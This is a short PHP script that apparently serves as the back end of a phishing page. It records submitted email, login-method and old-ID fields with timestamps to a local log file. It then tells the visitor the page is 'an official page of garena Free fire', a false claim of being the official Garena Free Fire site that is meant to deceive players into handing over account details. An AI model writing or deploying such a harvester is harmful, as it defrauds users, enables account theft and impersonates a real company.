<?php
$type = $_POST['type'] ?? '';
$email = $_POST['email'] ?? '';
$method = $_POST['method'] ?? '';
$old_id = $_POST['old_id'] ?? '';

$data = "----\nType: $type\nEmail: $email\nMethod: $method\nOld ID: $old_id\nTime: ".date("Y-m-d H:i:s")."\n";

file_put_contents("admin-log.txt", $data, FILE_APPEND);

echo "<h2 style='text-align:center;color:green;'>Data Submitted </h2>";
echo "<p style='text-align:center;'>This is an official page of garena Free fire</p>";
?>